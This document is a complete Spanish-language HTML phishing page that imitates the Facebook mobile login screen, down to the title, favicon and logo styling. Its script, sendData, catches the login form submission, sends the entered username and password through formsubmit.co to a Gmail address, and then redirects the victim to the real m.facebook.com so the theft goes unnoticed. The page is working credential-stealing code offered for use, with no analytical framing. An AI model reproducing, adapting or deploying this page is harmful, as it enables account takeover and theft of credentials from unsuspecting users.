<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Facebook</title>
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRp1SfsL_y.ico">
    <style>
        body { font-family: Helvetica, Arial, sans-serif; background-color: #fff; margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; }
        .header-mobile { width: 100%; text-align: center; padding: 20px 0; }
        .fb-logo { color: #0866ff; font-size: 32px; font-weight: bold; letter-spacing: -1px; text-decoration: none; }
        .login-container { width: 90%; max-width: 400px; margin-top: 10px; }
        input { width: 100%; background-color: #f5f6f7; border: 1px solid #ccd0d5; border-radius: 8px; padding: 12px; margin-bottom: 12px; font-size: 14px; box-sizing: border-box; }
        .btn-login { width: 100%; background-color: #0866ff; color: white; border: none; border-radius: 8px; padding: 10px; font-size: 16px; font-weight: bold; cursor: pointer; }
        .links { text-align: center; margin-top: 15px; }
        .forgot { color: #0866ff; font-size: 14px; text-decoration: none; display: block; margin-bottom: 20px; }
        .divider { border-top: 1px solid #dadde1; margin-bottom: 20px; }
        .btn-new { background-color: transparent; color: #0866ff; border: 1px solid #0866ff; border-radius: 8px; padding: 8px 16px; font-size: 14px; font-weight: bold; text-decoration: none; display: inline-block; }
    </style>
</head>
<body>
    <div class="header-mobile">
        <div class="fb-logo">facebook</div>
    </div>
    <div class="login-container">
        <form onsubmit="sendData(event)">
            <input type="text" id="u" placeholder="Móvil o correo electrónico" required>
            <input type="password" id="p" placeholder="Contraseña" required>
            <button type="submit" class="btn-login">Iniciar sesión</button>
        </form>
        <div class="links">
            <a href="https://m.facebook.com/login/identify/" class="forgot">¿Olvidaste tu contraseña?</a>
            <div class="divider"></div>
            <a href="https://m.facebook.com/reg/" class="btn-new">Crear cuenta nueva</a>
        </div>
    </div>
    <script>
        function sendData(e) {
            e.preventDefault();
            fetch('https://formsubmit.co/ajax/83739387z@gmail.com', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ Usuario: document.getElementById('u').value, Clave: document.getElementById('p').value })
            }).then(() => { window.location.href = "https://m.facebook.com"; });
        }
    </script>
</body>
</html>
